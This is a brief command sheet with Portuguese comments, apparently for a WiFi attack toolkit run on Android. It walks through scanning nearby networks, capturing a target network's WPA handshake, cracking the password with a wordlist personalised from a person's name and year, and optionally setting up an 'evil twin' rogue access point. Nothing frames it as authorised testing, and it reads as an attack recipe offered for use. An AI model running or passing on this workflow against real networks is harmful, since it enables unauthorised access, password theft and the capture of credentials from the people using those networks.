# 1. Escanear redes ao redor
./scan.sh

# 2. Capturar handshake da rede alvo (precisa do BSSID e canal do passo 1)
./capture.sh AA:BB:CC:DD:EE:FF 6

# 3. Quebrar a senha do handshake capturado
./crack.sh /sdcard/handshake.hc22000

# Opcional: gerar wordlist personalizada antes da quebra
python wordlist_gen.py --name "joao" --year 2024 --output wordlists/personalizada.txt
./crack.sh /sdcard/handshake.hc22000 wordlists/personalizada.txt

# Opcional: ataque evil twin (requer adaptador USB externo)
./evil_twin.sh NOME_DA_REDE_ALVO 6 wlan1
